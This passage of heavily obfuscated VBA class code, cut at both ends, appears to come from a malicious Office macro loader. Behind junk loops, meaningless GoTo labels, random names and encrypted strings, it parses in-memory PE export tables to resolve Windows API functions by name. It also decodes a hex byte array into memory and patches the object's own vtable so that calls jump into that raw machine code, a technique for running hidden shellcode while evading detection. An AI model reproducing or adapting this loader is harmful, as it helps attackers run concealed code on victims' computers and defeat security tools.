    w5f3T8DPrLqPgsgeYqnK = Replace(w5f3T8DPrLqPgsgeYqnK, K3P6Q7XhnjyMbiktRMpr, t1L1S6kGHRoVOuCUcSws)
GoTo Q6Z6G0egNhmukQYZXcAH
Q6Z6G0egNhmukQYZXcAH:
    w5f3T8DPrLqPgsgeYqnK = Replace(w5f3T8DPrLqPgsgeYqnK, Y5w1u4WWVaLSZpQPfVYQ, S3V1H6MvNRTLkNrcYMhX(C3h7q0YTywekEMChcdbg))
GoTo O7F1U4bSrHAjRToRVjfO
O7F1U4bSrHAjRToRVjfO:
    Call a5w4e7DXlYLlIHjRiUYw(w5f3T8DPrLqPgsgeYqnK)
GoTo B4a0K4SwVnNnsLtRBLRN
B4a0K4SwVnNnsLtRBLRN:
    D0e6b8awQpQbVnXtdotq = Z1q8O7uJFoCbbDLXATWo
GoTo Z7F2O4upTVCIbjZFAAEo
Z7F2O4upTVCIbjZFAAEo:
End Function

Private Function S3V1H6MvNRTLkNrcYMhX(ByVal O5m3V1uVrFTAREIhVTNf As Long) As String
GoTo y0T8s1CtSyaYGuPGvKUE
y0T8s1CtSyaYGuPGvKUE:
    Dim c0V8A8HKZuyGPKnDWqJE(3)   As Byte
GoTo D7q3a7PiOlEQECyOLhRb
D7q3a7PiOlEQECyOLhRb:
    Dim h1S5G4FdyHysmFCZJTZV2           As Long
    Dim h5p1I5enLsWlSYrApVQR As String, P3F8F6KyMPSKjMqbWLfW As String, N4l3T1sUqDRQCGgUSMeb() As String, w3s8u1JYtuEOJmCVoIDr As String, X5h5k4OVANMcgiaAPHrZ As Integer
    h5p1I5enLsWlSYrApVQR = Chr$(53)
    For X5h5k4OVANMcgiaAPHrZ = 1 To Len(h5p1I5enLsWlSYrApVQR)
    P3F8F6KyMPSKjMqbWLfW = P3F8F6KyMPSKjMqbWLfW & IIf(X5h5k4OVANMcgiaAPHrZ = 1, Asc(Mid$(h5p1I5enLsWlSYrApVQR, X5h5k4OVANMcgiaAPHrZ, 1)), Chr$(124) & Asc(Mid$(h5p1I5enLsWlSYrApVQR, X5h5k4OVANMcgiaAPHrZ, 1)))
    Next X5h5k4OVANMcgiaAPHrZ
    N4l3T1sUqDRQCGgUSMeb() = Split(P3F8F6KyMPSKjMqbWLfW, Chr$(124))
    For X5h5k4OVANMcgiaAPHrZ = 0 To UBound(N4l3T1sUqDRQCGgUSMeb)
    w3s8u1JYtuEOJmCVoIDr = w3s8u1JYtuEOJmCVoIDr & Chr(CLng(N4l3T1sUqDRQCGgUSMeb(X5h5k4OVANMcgiaAPHrZ)))
    Next X5h5k4OVANMcgiaAPHrZ
    If w3s8u1JYtuEOJmCVoIDr = Chr$(53) Then GoTo 5
5:
    K8p5p5tEmmaMnKWkSjVZ c0V8A8HKZuyGPKnDWqJE(0), O5m3V1uVrFTAREIhVTNf, &H4
GoTo y4d7C4jXKkHGhPgTXvXi
y4d7C4jXKkHGhPgTXvXi:
    For h1S5G4FdyHysmFCZJTZV2 = 0 To 3
GoTo B3Q6J6ZVhwNiWfDwbdKd
B3Q6J6ZVhwNiWfDwbdKd:
        S3V1H6MvNRTLkNrcYMhX = S3V1H6MvNRTLkNrcYMhX & Right(Y1A0E7(Chr$(2), Chr$(102) & Chr$(56) & Chr$(69) & Chr$(55) & Chr$(109) & Chr$(52) & Chr$(90) & Chr$(66) & Chr$(75) & Chr$(87)) & Hex(c0V8A8HKZuyGPKnDWqJE(h1S5G4FdyHysmFCZJTZV2)), 2)
GoTo j7g2V4UZvDLoCBRVXPoE
j7g2V4UZvDLoCBRVXPoE:
    Next
GoTo y5O3k2SgcLYwZiuXqVtM
y5O3k2SgcLYwZiuXqVtM:
End Function

Private Sub a5w4e7DXlYLlIHjRiUYw(ByVal Y6d8s2lKCwKbpLIfaEGm As String)
GoTo l2X3j3pZjplwOdkmyTOr
l2X3j3pZjplwOdkmyTOr:
    Dim h1S5G4FdyHysmFCZJTZV3   As Long
    Dim t4g0I8dYYXcNUbrSRhXa As String, S7U0v5TneVisbbPPpLnH As String, m2c7c4TljGpAGCOefBDM() As String, j3u2q8QYOtoonsdWdIiU As String, k7q6H6PAujEulJsrfRsP As Integer
    t4g0I8dYYXcNUbrSRhXa = Chr$(53)
    For k7q6H6PAujEulJsrfRsP = 1 To Len(t4g0I8dYYXcNUbrSRhXa)
    S7U0v5TneVisbbPPpLnH = S7U0v5TneVisbbPPpLnH & IIf(k7q6H6PAujEulJsrfRsP = 1, Asc(Mid$(t4g0I8dYYXcNUbrSRhXa, k7q6H6PAujEulJsrfRsP, 1)), Chr$(124) & Asc(Mid$(t4g0I8dYYXcNUbrSRhXa, k7q6H6PAujEulJsrfRsP, 1)))
    Next k7q6H6PAujEulJsrfRsP
    m2c7c4TljGpAGCOefBDM() = Split(S7U0v5TneVisbbPPpLnH, Chr$(124))
    For k7q6H6PAujEulJsrfRsP = 0 To UBound(m2c7c4TljGpAGCOefBDM)
    j3u2q8QYOtoonsdWdIiU = j3u2q8QYOtoonsdWdIiU & Chr(CLng(m2c7c4TljGpAGCOefBDM(k7q6H6PAujEulJsrfRsP)))
    Next k7q6H6PAujEulJsrfRsP
    If j3u2q8QYOtoonsdWdIiU = Chr$(53) Then GoTo 5
5:
    For h1S5G4FdyHysmFCZJTZV3 = 0 To Len(Y6d8s2lKCwKbpLIfaEGm) - 1 Step 2
GoTo p4o4e1sqkDAWrRWSehvS
p4o4e1sqkDAWrRWSehvS:
        n7i1W2AhjEglyerRRsBO((h1S5G4FdyHysmFCZJTZV3 / 2)) = CByte(Y1A0E7(Chr$(28) & Chr$(30), Chr$(119) & Chr$(51) & Chr$(118) & Chr$(51) & Chr$(110) & Chr$(48) & Chr$(110) & Chr$(107) & Chr$(101) & Chr$(118)) & Mid$(Y6d8s2lKCwKbpLIfaEGm, h1S5G4FdyHysmFCZJTZV3 + 1, 2))
GoTo F2Y3y2eSMChqqpufYfKX
F2Y3y2eSMChqqpufYfKX:
    Next
GoTo W6p8k1YRBilGimBLgtgT
W6p8k1YRBilGimBLgtgT:
End Sub

Private Function Z1q8O7uJFoCbbDLXATWo() As Long
    Dim u3P7Z7cgHgrlEBYtSLHS As String, j8T1R7jNOuPUcSwHHGLh As String, o8a7m0GJBZohRACWEROv() As String, K6j2T5IbHfvXvICUEaKV As String, b4i0O4XhFAdeLSksiOJK As Integer
    u3P7Z7cgHgrlEBYtSLHS = Chr$(49)
    For b4i0O4XhFAdeLSksiOJK = 1 To Len(u3P7Z7cgHgrlEBYtSLHS)
    j8T1R7jNOuPUcSwHHGLh = j8T1R7jNOuPUcSwHHGLh & IIf(b4i0O4XhFAdeLSksiOJK = 1, Asc(Mid$(u3P7Z7cgHgrlEBYtSLHS, b4i0O4XhFAdeLSksiOJK, 1)), Chr$(124) & Asc(Mid$(u3P7Z7cgHgrlEBYtSLHS, b4i0O4XhFAdeLSksiOJK, 1)))
    Next b4i0O4XhFAdeLSksiOJK
    o8a7m0GJBZohRACWEROv() = Split(j8T1R7jNOuPUcSwHHGLh, Chr$(124))
    For b4i0O4XhFAdeLSksiOJK = 0 To UBound(o8a7m0GJBZohRACWEROv)
    K6j2T5IbHfvXvICUEaKV = K6j2T5IbHfvXvICUEaKV & Chr(CLng(o8a7m0GJBZohRACWEROv(b4i0O4XhFAdeLSksiOJK)))
    Next b4i0O4XhFAdeLSksiOJK
    If K6j2T5IbHfvXvICUEaKV = Chr$(49) Then GoTo 1
1:
    K8p5p5tEmmaMnKWkSjVZ l7Q7C8OLhDcUQbsIdQaw, ByVal ObjPtr(Me), &H4
GoTo N0F2d0DTJMDcFkiQFZPG
N0F2d0DTJMDcFkiQFZPG:
    l7Q7C8OLhDcUQbsIdQaw = l7Q7C8OLhDcUQbsIdQaw + &H1C
GoTo U5N2A0bjvYsXyNZOLFXU
U5N2A0bjvYsXyNZOLFXU:
    K8p5p5tEmmaMnKWkSjVZ s4Y1Y5mbHQRPUrwFjvyM, ByVal l7Q7C8OLhDcUQbsIdQaw, &H4
GoTo q4l7n0QRmowVCfyciCKe
q4l7n0QRmowVCfyciCKe:
    K8p5p5tEmmaMnKWkSjVZ ByVal l7Q7C8OLhDcUQbsIdQaw, VarPtr(n7i1W2AhjEglyerRRsBO(0)), &H4
GoTo w0v0n5nSsetwBrRtZJFt
w0v0n5nSsetwBrRtZJFt:
    Z1q8O7uJFoCbbDLXATWo = p1o2e1fqkDlIrDJFQhvE
GoTo O1u1T0CobDYlAhkoODAt
O1u1T0CobDYlAhkoODAt:
    K8p5p5tEmmaMnKWkSjVZ ByVal l7Q7C8OLhDcUQbsIdQaw, s4Y1Y5mbHQRPUrwFjvyM, &H4
GoTo M1g0a5cnrGbdmvqUkDXq
M1g0a5cnrGbdmvqUkDXq:
End Function

Public Function O7A8M8SCNSParGOPYvqU(ByVal u5h0J0eZaYdOVcsTTiYb As String, ByVal T7V0w5UofWjudcQQrAMo As String) As Long
    Dim j6u3c7YfwGybWXVaMFMp As String, R0S4Z3pSwhdRmcThraaN As String, A4v1Y1XJNmbYSkhEaFBM() As String, Q5A0L3PsJbyPJennlqcV As String, c1T3i6phGVOwfiDfjwId As Integer
    j6u3c7YfwGybWXVaMFMp = Chr$(55)
    For c1T3i6phGVOwfiDfjwId = 1 To Len(j6u3c7YfwGybWXVaMFMp)
    R0S4Z3pSwhdRmcThraaN = R0S4Z3pSwhdRmcThraaN & IIf(c1T3i6phGVOwfiDfjwId = 1, Asc(Mid$(j6u3c7YfwGybWXVaMFMp, c1T3i6phGVOwfiDfjwId, 1)), Chr$(124) & Asc(Mid$(j6u3c7YfwGybWXVaMFMp, c1T3i6phGVOwfiDfjwId, 1)))
    Next c1T3i6phGVOwfiDfjwId
    A4v1Y1XJNmbYSkhEaFBM() = Split(R0S4Z3pSwhdRmcThraaN, Chr$(124))
    For c1T3i6phGVOwfiDfjwId = 0 To UBound(A4v1Y1XJNmbYSkhEaFBM)
    Q5A0L3PsJbyPJennlqcV = Q5A0L3PsJbyPJennlqcV & Chr(CLng(A4v1Y1XJNmbYSkhEaFBM(c1T3i6phGVOwfiDfjwId)))
    Next c1T3i6phGVOwfiDfjwId
    If Q5A0L3PsJbyPJennlqcV = Chr$(55) Then GoTo 7
7:
    O7A8M8SCNSParGOPYvqU = Me.N6S8L7wRZPupqoteXeJk(Me.I7L5p5bVnkHqCHEPghDE(u5h0J0eZaYdOVcsTTiYb), T7V0w5UofWjudcQQrAMo)
GoTo d3r2M7WnZdDdoiBwVqPH
d3r2M7WnZdDdoiBwVqPH:
End Function

Public Function I7L5p5bVnkHqCHEPghDE(ByVal u5h0J0eZaYdOVcsTTiYb As String) As Long
    Dim E2g8Q0NlfJLrMRZPuEED As String, H5l8X6jADGwWleOyTyAO As String, L8H5g1QcFYEctTtFRBXH() As String, S4U5v2TUdCvZbIOhpfLG As String, H1K8C1ZBAQGIAZCgeNBW As Integer
    E2g8Q0NlfJLrMRZPuEED = Chr$(50)
    For H1K8C1ZBAQGIAZCgeNBW = 1 To Len(E2g8Q0NlfJLrMRZPuEED)
    H5l8X6jADGwWleOyTyAO = H5l8X6jADGwWleOyTyAO & IIf(H1K8C1ZBAQGIAZCgeNBW = 1, Asc(Mid$(E2g8Q0NlfJLrMRZPuEED, H1K8C1ZBAQGIAZCgeNBW, 1)), Chr$(124) & Asc(Mid$(E2g8Q0NlfJLrMRZPuEED, H1K8C1ZBAQGIAZCgeNBW, 1)))
    Next H1K8C1ZBAQGIAZCgeNBW
    L8H5g1QcFYEctTtFRBXH() = Split(H5l8X6jADGwWleOyTyAO, Chr$(124))
    For H1K8C1ZBAQGIAZCgeNBW = 0 To UBound(L8H5g1QcFYEctTtFRBXH)
    S4U5v2TUdCvZbIOhpfLG = S4U5v2TUdCvZbIOhpfLG & Chr(CLng(L8H5g1QcFYEctTtFRBXH(H1K8C1ZBAQGIAZCgeNBW)))
    Next H1K8C1ZBAQGIAZCgeNBW
    If S4U5v2TUdCvZbIOhpfLG = Chr$(50) Then GoTo 2
2:
    I7L5p5bVnkHqCHEPghDE = D0e6b8awQpQbVnXtdotq(V7I5V2qAAEohoTgfyCtS, StrPtr(u5h0J0eZaYdOVcsTTiYb & vbNullChar))
GoTo D3b2K8vYgtVoUsKWKICU
D3b2K8vYgtVoUsKWKICU:
End Function

Public Property Get Initialized() As Boolean
GoTo R7X6o6yNOjkuScrYfwGy
R7X6o6yNOjkuScrYfwGy:
    Initialized = h4L7u2rvKUpDqcEaZBiA
GoTo A8y8j5kOpaquvoOqVGCp
A8y8j5kOpaquvoOqVGCp:
End Property

Public Sub Class_Initialize()
    Dim L0r1Q0lYVivdyhlLvqJG As String, c0X5Z6nDYZjsnRgAUmhX As String, D2M2P0tBfrqHLOFetmWE() As String, H4E1W5CPCoPlkNuMwCbC As String, N1Z4s2nfbnFToclJEhjQ As Integer
    L0r1Q0lYVivdyhlLvqJG = Chr$(54)
    For N1Z4s2nfbnFToclJEhjQ = 1 To Len(L0r1Q0lYVivdyhlLvqJG)
    c0X5Z6nDYZjsnRgAUmhX = c0X5Z6nDYZjsnRgAUmhX & IIf(N1Z4s2nfbnFToclJEhjQ = 1, Asc(Mid$(L0r1Q0lYVivdyhlLvqJG, N1Z4s2nfbnFToclJEhjQ, 1)), Chr$(124) & Asc(Mid$(L0r1Q0lYVivdyhlLvqJG, N1Z4s2nfbnFToclJEhjQ, 1)))
    Next N1Z4s2nfbnFToclJEhjQ
    D2M2P0tBfrqHLOFetmWE() = Split(c0X5Z6nDYZjsnRgAUmhX, Chr$(124))
    For N1Z4s2nfbnFToclJEhjQ = 0 To UBound(D2M2P0tBfrqHLOFetmWE)
    H4E1W5CPCoPlkNuMwCbC = H4E1W5CPCoPlkNuMwCbC & Chr(CLng(D2M2P0tBfrqHLOFetmWE(N1Z4s2nfbnFToclJEhjQ)))
    Next N1Z4s2nfbnFToclJEhjQ
    If H4E1W5CPCoPlkNuMwCbC = Chr$(54) Then GoTo 6
6:
    Call a5w4e7DXlYLlIHjRiUYw(M2j2Q5aJXyvXgsVoTrKj)
GoTo p8n3c5afDKRyIIXbeWuK
p8n3c5afDKRyIIXbeWuK:
    A7k5v8RmLRNZcqMOXhcG = Z1q8O7uJFoCbbDLXATWo
GoTo D6U4r3YmjSfFFgoBdvcA
D6U4r3YmjSfFFgoBdvcA:
    If Not A7k5v8RmLRNZcqMOXhcG = 0 Then
GoTo S7S5X7ZyfqysEVjrsCaU
S7S5X7ZyfqysEVjrsCaU:
        V7I5V2qAAEohoTgfyCtS = N6S8L7wRZPupqoteXeJk(A7k5v8RmLRNZcqMOXhcG, Y1A0E7(Chr$(240) & Chr$(23) & Chr$(143) & Chr$(132) & Chr$(140) & Chr$(233) & Chr$(98) & Chr$(112) & Chr$(99) & Chr$(112) & Chr$(123) & Chr$(85), Chr$(116) & Chr$(51) & Chr$(66) & Chr$(50) & Chr$(82) & Chr$(50) & Chr$(90) & Chr$(112) & Chr$(113) & Chr$(77)))
GoTo j6S4r0pVQQPUFMTjKKZP
j6S4r0pVQQPUFMTjKKZP:
        If Not V7I5V2qAAEohoTgfyCtS = 0 Then
GoTo S2i2q7WLfWNakUTHHiqD
S2i2q7WLfWNakUTHHiqD:
            h4L7u2rvKUpDqcEaZBiA = True
GoTo f0e0U5USMebwhswtGXYt
f0e0U5USMebwhswtGXYt:
        End If
GoTo u1c1m0ioIQGlghfkVOVA
u1c1m0ioIQGlghfkVOVA:
    End If
GoTo a2c5i4AcHrmbymdqCkjX
a2c5i4AcHrmbymdqCkjX:
End Sub

Public Function N6S8L7wRZPupqoteXeJk(ByVal t1G4Z5UsIBkSVpSWkhQd As Long, ByVal T7V0w5UofWjudcQQrAMo As String) As Long
GoTo h1f7G7FquVJHBTQmIhmj
h1f7G7FquVJHBTQmIhmj:
    Dim tq8T4g2YXnrtlLaSDkmHj       As q8T4g2YXnrtlLaSDkmHj
GoTo u8N6j8DwbqKdvrgMVWUZ
u8N6j8DwbqKdvrgMVWUZ:
    Dim tK0q1P8wllMVGiCgFXiXU       As K0q1P8wllMVGiCgFXiXU
GoTo K0K7C0RVXPoEygOQkNSf
K0K7C0RVXPoEygOQkNSf:
    Dim tO5d0k8BvJZaywHeMoFlr As O5d0k8BvJZaywHeMoFlr
    Dim q2Y2w4yuWEVIMlMXRjgD As String, Z8p6w2dmyTOrtatAIvcl As String, m6p2T4FSRhlnfFUMvegC() As String, e6v8b7OPpLnHlKcCcnhA As String, i1p0G0OetBDMjeIKqvQY As Integer
    q2Y2w4yuWEVIMlMXRjgD = Chr$(50)
    For i1p0G0OetBDMjeIKqvQY = 1 To Len(q2Y2w4yuWEVIMlMXRjgD)
    Z8p6w2dmyTOrtatAIvcl = Z8p6w2dmyTOrtatAIvcl & IIf(i1p0G0OetBDMjeIKqvQY = 1, Asc(Mid$(q2Y2w4yuWEVIMlMXRjgD, i1p0G0OetBDMjeIKqvQY, 1)), Chr$(124) & Asc(Mid$(q2Y2w4yuWEVIMlMXRjgD, i1p0G0OetBDMjeIKqvQY, 1)))
    Next i1p0G0OetBDMjeIKqvQY
    m6p2T4FSRhlnfFUMvegC() = Split(Z8p6w2dmyTOrtatAIvcl, Chr$(124))
    For i1p0G0OetBDMjeIKqvQY = 0 To UBound(m6p2T4FSRhlnfFUMvegC)
    e6v8b7OPpLnHlKcCcnhA = e6v8b7OPpLnHlKcCcnhA & Chr(CLng(m6p2T4FSRhlnfFUMvegC(i1p0G0OetBDMjeIKqvQY)))
    Next i1p0G0OetBDMjeIKqvQY
    If e6v8b7OPpLnHlKcCcnhA = Chr$(50) Then GoTo 2
2:
    Call K8p5p5tEmmaMnKWkSjVZ(tq8T4g2YXnrtlLaSDkmHj, ByVal t1G4Z5UsIBkSVpSWkhQd, F5j5q8JefptXnGatndJS)
GoTo t7o7s5krIihwnqiHkPNu
t7o7s5krIihwnqiHkPNu:
    If Not tq8T4g2YXnrtlLaSDkmHj.e_magic = p6q3y5vBEuUvcMIyRHwM Then
GoTo I5T1X6QQEEenAcybRdRO
I5T1X6QQEEenAcybRdRO:
        Exit Function
GoTo I4X8e7uqDTUprBYGjflF
I4X8e7uqDTUprBYGjflF:
    End If
GoTo N0i5d5hSLSvXJZcfXyZE
N0i5d5hSLSvXJZcfXyZE:
    Call K8p5p5tEmmaMnKWkSjVZ(tK0q1P8wllMVGiCgFXiXU, ByVal t1G4Z5UsIBkSVpSWkhQd + tq8T4g2YXnrtlLaSDkmHj.e_lfanew, S3V1A1lwwNRUMkAscKNh)
GoTo n6Y8j4nwhgUGhEQeMdPT
n6Y8j4nwhgUGhEQeMdPT:
    If Not tK0q1P8wllMVGiCgFXiXU.Signature = W1F7e1boDjCnrRGDvPMi Then
GoTo t6f4r7LgFLHTWlHIRbWA
t6f4r7LgFLHTWlHIRbWA:
        Exit Function
GoTo P6C3P1ktuswibiNaZpsy
P6C3P1ktuswibiNaZpsy:
    End If
GoTo M6A8d2NhKPcmIVJuWsrT
M6A8d2NhKPcmIVJuWsrT:
    Dim t3c7Y7cgGtrlEBXtSYUf   As Long
GoTo B3E1i1UOgdAVumitLayi
B3E1i1UOgdAVumitLayi:
    Dim i8T3e7iMbuOhcRvGHFKu      As Long
GoTo s3L7q4qvFtZijhmKQXCP
s3L7q4qvFtZijhmKQXCP:
    Dim o8Z6l0GIAZogRBWDRbyK       As Long
GoTo O5i6c0RJtbdwafspYlLL
O5i6c0RJtbdwafspYlLL:
    With tK0q1P8wllMVGiCgFXiXU.OptionalHeader
GoTo m8I6E6HYZkevfDmvDLbq
m8I6E6HYZkevfDmvDLbq:
        t3c7Y7cgGtrlEBXtSYUf = t1G4Z5UsIBkSVpSWkhQd + .DataDirectory(0).VirtuaC6t0R7rHvArQtYWEsNEu
GoTo j6u3N7rYewGybWXVaLSZ
j6u3N7rYewGybWXVaLSZ:
        i8T3e7iMbuOhcRvGHFKu = t3c7Y7cgGtrlEBXtSYUf + .DataDirectory(0).Size
GoTo p3Q5W4QpSvudRmcThraa
p3Q5W4QpSvudRmcThraa:
        o8Z6l0GIAZogRBWDRbyK = .ImageBase
GoTo M5e0B2iPsIoyOWMrmnlq
M5e0B2iPsIoyOWMrmnlq:
    End With
GoTo c3c1h3impgGiOwtiDsjw
c3c1h3impgGiOwtiDsjw:
    Call K8p5p5tEmmaMnKWkSjVZ(tO5d0k8BvJZaywHeMoFlr, ByVal t3c7Y7cgGtrlEBXtSYUf, K2c6I3IuWrqTBSEIhITN)
GoTo I7q5Q7NaoWnZdDroiBwU
I7q5Q7NaoWnZdDroiBwU:
    Dim h1S5G4FdyHysmFCZJTZV4           As Long
GoTo P7t7B1TopAJEhwQkEwnT
P7t7B1TopAJEhwQkEwnT:
    Dim W6O6X5EceLfksiOWXVaw   As Long
GoTo b5a5R1RyIIXbeVuKDmUX
b5a5R1RyIIXbeVuKDmUX:
    Dim F2q0C3WZQpFwhPSmPThd    As Long
GoTo r3Y6v3fSFgCBdLcOSrSd
r3Y6v3fSFgCBdLcOSrSd:
    Dim k0Y4I3vQyTlLlvqJrPJP    As Long
GoTo X7m1f0yrEVjFsCaUwAgB
X7m1f0yrEVjFsCaUwAgB:
    With tO5d0k8BvJZaywHeMoFlr
GoTo G2E6s8ryTahMYYnrumLa
G2E6s8ryTahMYYnrumLa:
        For h1S5G4FdyHysmFCZJTZV4 = 0 To .NumberOfNames - 1
GoTo r5J2g1NbXHUttVdpSlRo
r5J2g1NbXHUttVdpSlRo:
            K8p5p5tEmmaMnKWkSjVZ F2q0C3WZQpFwhPSmPThd, ByVal o8Z6l0GIAZogRBWDRbyK + .lpAddressOfNames + h1S5G4FdyHysmFCZJTZV4 * 4, 4
GoTo H5H3M5OkUfkhsKYghqPJ
H5H3M5OkUfkhsKYghqPJ:
            If J5U2Y6SRFqSoBPvOAEeS(o8Z6l0GIAZogRBWDRbyK + F2q0C3WZQpFwhPSmPThd) = T7V0w5UofWjudcQQrAMo Then
GoTo m7V5u0sYTUSXIPWmNNdT
m7V5u0sYTUSXIPWmNNdT:
                K8p5p5tEmmaMnKWkSjVZ k0Y4I3vQyTlLlvqJrPJP, ByVal o8Z6l0GIAZogRBWDRbyK + .lpAddressOfNameOrdinals + h1S5G4FdyHysmFCZJTZV4 * 2, 2
GoTo V2m2t7ZOiZQdoXWKKltG
V2m2t7ZOiZQdoXWKKltG:
                K8p5p5tEmmaMnKWkSjVZ W6O6X5EceLfksiOWXVaw, ByVal o8Z6l0GIAZogRBWDRbyK + .lpAddressOfFunctions + k0Y4I3vQyTlLlvqJrPJP * 4, 4
GoTo i0h1X6XVPheBkyBwJabv
i0h1X6XVPheBkyBwJabv:
                N6S8L7wRZPupqoteXeJk = W6O6X5EceLfksiOWXVaw + o8Z6l0GIAZogRBWDRbyK
GoTo W5E6O5KQjrhNIJHMvpvb
W5E6O5KQjrhNIJHMvpvb:
                If N6S8L7wRZPupqoteXeJk >= t3c7Y7cgGtrlEBXtSYUf And _
                   N6S8L7wRZPupqoteXeJk <= i8T3e7iMbuOhcRvGHFKu Then
GoTo M6u1q1uYMKEWTpMkqmwB
M6u1q1uYMKEWTpMkqmwB:
                    Call L4n0K2VsnRTAGZhXDwwv(N6S8L7wRZPupqoteXeJk, t1G4Z5UsIBkSVpSWkhQd, T7V0w5UofWjudcQQrAMo)
GoTo Q6m8G0etNgAujPYZXcNH
Q6m8G0etNgAujPYZXcNH:
                    If Not t1G4Z5UsIBkSVpSWkhQd = 0 Then
GoTo O7F1U4aSrHjRToRVjtOc
O7F1U4aSrHjRToRVjtOc:
                        N6S8L7wRZPupqoteXeJk = N6S8L7wRZPupqoteXeJk(t1G4Z5UsIBkSVpSWkhQd, T7V0w5UofWjudcQQrAMo)
GoTo P0c0w4HZLPoPaUmjGcBs
P0c0w4HZLPoPaUmjGcBs:
                    Else
GoTo a6D3n4kIDgiOiovlRabZ
a6D3n4kIDgiOiovlRabZ:
                        N6S8L7wRZPupqoteXeJk = 0
GoTo e0I2t1GWacUtJBlTVpSX
e0I2t1GWacUtJBlTVpSX:
                    End If
GoTo k6Q5D0emAbyaQqRcWoXu
k6Q5D0emAbyaQqRcWoXu:
                End If
GoTo e7u7D3iprBYTvflFNChd
e7u7D3iprBYTvflFNChd:
                Exit Function
GoTo d5g3Y5vXWmcfXyZECjYs
d5g3Y5vXWmcfXyZECjYs:
            End If
GoTo H8M4F1rrTcoQkPnGRGDv
H8M4F1rrTcoQkPnGRGDv:
        Next
GoTo P2j3d6frIJegpNtXnUat
P2j3d6frIJegpNtXnUat:
    End With
GoTo C7W3S3WHAHlMwORUMkOs
C7W3S3WHAHlMwORUMkOs:
End Function

Private Function L4n0K2VsnRTAGZhXDwwv(ByVal C6t0R7rHvArQtYWEsNEu As Long, ByRef I3C0o7QYkNgMjCOCAtMJ As Long, ByRef f2a5b7FGbclKqUjQWpwn As String)
GoTo c4N6X2cmVVIuWsFTBSEI
c4N6X2cmVVIuWsFTBSEI:
    Dim T2P2S0yDhItKOQIhKoZU     As String
    Dim i4T2f5AVtAyILZuvGQLn As String, E4q2E8ZiihmXQXCPOehk As String, c0Q1s4dwafsDYlZLmJIj() As String, R6U4Y6dytQlKDKbpMJgb As String, F1m1M3KpAwDagnSfeuwB As Integer
    i4T2f5AVtAyILZuvGQLn = Chr$(56)
    For F1m1M3KpAwDagnSfeuwB = 1 To Len(i4T2f5AVtAyILZuvGQLn)
    E4q2E8ZiihmXQXCPOehk = E4q2E8ZiihmXQXCPOehk & IIf(F1m1M3KpAwDagnSfeuwB = 1, Asc(Mid$(i4T2f5AVtAyILZuvGQLn, F1m1M3KpAwDagnSfeuwB, 1)), Chr$(124) & Asc(Mid$(i4T2f5AVtAyILZuvGQLn, F1m1M3KpAwDagnSfeuwB, 1)))
    Next F1m1M3KpAwDagnSfeuwB
    c0Q1s4dwafsDYlZLmJIj() = Split(E4q2E8ZiihmXQXCPOehk, Chr$(124))
    For F1m1M3KpAwDagnSfeuwB = 0 To UBound(c0Q1s4dwafsDYlZLmJIj)
    R6U4Y6dytQlKDKbpMJgb = R6U4Y6dytQlKDKbpMJgb & Chr(CLng(c0Q1s4dwafsDYlZLmJIj(F1m1M3KpAwDagnSfeuwB)))
    Next F1m1M3KpAwDagnSfeuwB
    If R6U4Y6dytQlKDKbpMJgb = Chr$(56) Then GoTo 8
8:
    T2P2S0yDhItKOQIhKoZU = J5U2Y6SRFqSoBPvOAEeS(C6t0R7rHvArQtYWEsNEu)
GoTo p1w6Q3mPUheNaAAbjvYr
p1w6Q3mPUheNaAAbjvYr:
    If InStr(1, T2P2S0yDhItKOQIhKoZU, Y1A0E7(Chr$(250), Chr$(79) & Chr$(52) & Chr$(117) & Chr$(53) & Chr$(70) & Chr$(51) & Chr$(67) & Chr$(73) & Chr$(98) & Chr$(106))) Then
GoTo X8N7N4TlUqalrnQfmnwV
X8N7N4TlUqalrnQfmnwV:
        I3C0o7QYkNgMjCOCAtMJ = I7L5p5bVnkHqCHEPghDE(Split(T2P2S0yDhItKOQIhKoZU, Y1A0E7(Chr$(250), Chr$(79) & Chr$(52) & Chr$(117) & Chr$(53) & Chr$(70) & Chr$(51) & Chr$(67) & Chr$(73) & Chr$(98) & Chr$(106)))(0))
GoTo Q8y5i0JeZaYdPVctUTjZ
Q8y5i0JeZaYdPVctUTjZ:
        f2a5b7FGbclKqUjQWpwn = Split(T2P2S0yDhItKOQIhKoZU, Y1A0E7(Chr$(250), Chr$(79) & Chr$(52) & Chr$(117) & Chr$(53) & Chr$(70) & Chr$(51) & Chr$(67) & Chr$(73) & Chr$(98) & Chr$(106)))(1)
GoTo c3s4B0gVpfWkuddQQrAN
c3s4B0gVpfWkuddQQrAN:
    End If
GoTo o1n2d7ebVnkIqCIEPghD
o1n2d7ebVnkIqCIEPghD:
End Function

Private Function J5U2Y6SRFqSoBPvOAEeS(ByVal C6t0R7rHvArQtYWEsNEu As Long) As String
GoTo c6K7U6QXqnTPPNSEvEiJ
c6K7U6QXqnTPPNSEvEiJ:
    Dim Q1c4y3qysEHWrsCMHkAT       As Byte
    Dim u2O3J6LpZVKeULZjSSFr As String, T7C3w2BFeTQKcZvSqvsF As String, I4r8D2HkBTnHBqWffeiU() As String, N3L2b5hZwNGpXauXbpAV As String, i4I6G1gOfRVuVgaspNiH As Integer
    u2O3J6LpZVKeULZjSSFr = Chr$(48)
    For i4I6G1gOfRVuVgaspNiH = 1 To Len(u2O3J6LpZVKeULZjSSFr)
    T7C3w2BFeTQKcZvSqvsF = T7C3w2BFeTQKcZvSqvsF & IIf(i4I6G1gOfRVuVgaspNiH = 1, Asc(Mid$(u2O3J6LpZVKeULZjSSFr, i4I6G1gOfRVuVgaspNiH, 1)), Chr$(124) & Asc(Mid$(u2O3J6LpZVKeULZjSSFr, i4I6G1gOfRVuVgaspNiH, 1)))
    Next i4I6G1gOfRVuVgaspNiH
    I4r8D2HkBTnHBqWffeiU() = Split(T7C3w2BFeTQKcZvSqvsF, Chr$(124))
    For i4I6G1gOfRVuVgaspNiH = 0 To UBound(I4r8D2HkBTnHBqWffeiU)
    N3L2b5hZwNGpXauXbpAV = N3L2b5hZwNGpXauXbpAV & Chr(CLng(I4r8D2HkBTnHBqWffeiU(i4I6G1gOfRVuVgaspNiH)))
    Next i4I6G1gOfRVuVgaspNiH
    If N3L2b5hZwNGpXauXbpAV = Chr$(48) Then GoTo 0
0:
    Do
GoTo y1Y7I8FdYBDjEJRHmyyu
y1Y7I8FdYBDjEJRHmyyu:
        K8p5p5tEmmaMnKWkSjVZ Q1c4y3qysEHWrsCMHkAT, ByVal C6t0R7rHvArQtYWEsNEu, 1
GoTo A4d6P5bruwpOdWGoqLns
A4d6P5bruwpOdWGoqLns:
        C6t0R7rHvArQtYWEsNEu = C6t0R7rHvArQtYWEsNEu + 1
